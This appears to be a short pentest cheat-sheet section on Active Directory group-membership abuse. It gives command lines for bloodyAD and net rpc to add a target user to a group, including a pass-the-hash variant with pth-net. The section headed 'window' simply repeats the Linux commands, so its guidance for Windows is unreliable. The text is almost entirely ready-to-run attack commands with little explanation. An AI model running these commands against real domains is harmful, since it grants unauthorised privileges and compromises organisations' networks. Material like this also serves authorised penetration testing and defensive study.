

Linux

The easiest option would be to use bloodyAD
```
bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember $TargetGroup $TargetUser
```


Or it can be done manually
```
# With net and cleartext credentials (will be prompted)
net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser -S $DomainController

# With net and cleartext credentials
net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%$Password -S $DomainController

# With Pass-the-Hash
pth-net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%ffffffffffffffffffffffffffffffff:$NThash -S $DomainController
```


window
```
# With net and cleartext credentials (will be prompted)
net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser -S $DomainController

# With net and cleartext credentials
net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%$Password -S $DomainController

# With Pass-the-Hash
pth-net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%ffffffffffffffffffffffffffffffff:$NThash -S $DomainController
```

